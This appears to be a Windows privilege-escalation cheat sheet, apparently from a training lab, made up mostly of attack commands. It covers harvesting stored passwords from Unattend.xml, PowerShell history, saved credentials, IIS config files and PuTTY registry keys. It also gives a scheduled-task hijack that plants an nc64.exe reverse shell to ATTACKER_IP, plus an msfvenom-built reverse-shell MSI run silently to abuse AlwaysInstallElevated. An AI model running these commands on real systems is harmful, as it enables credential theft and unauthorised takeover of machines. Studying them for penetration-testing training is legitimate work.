# Password Harvesting
The easiest way to elevate your privileges is to steal credentials from an application. 

### Unattended Windows Installations:
Credentials left by automatic windows installations may be in:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`
```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Creds
```cmd
cmdkey /list

runas /savedcred /user:admin cmd.exe
```

### IIS Config
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### From putty:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
``` 

# Quick wins
### Scheduled Tasks
```cmd
:: View Scheduled Tasks
schtasks

:: View more info for each task
schtasks /query /tn vulntask /fo list /v

:: Check if current user can modify the task
icacls c:\path\to\vulntask

:: Spawn a NC shell (assuming NC is installed to c:\tools)
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask
```

### AlwaysInstallElevated
```
:: Requires these to be set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Create a malicious msi to abuse the install perms:**
```bash 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.179.108 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

**Run the msi on the windows instance:**
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

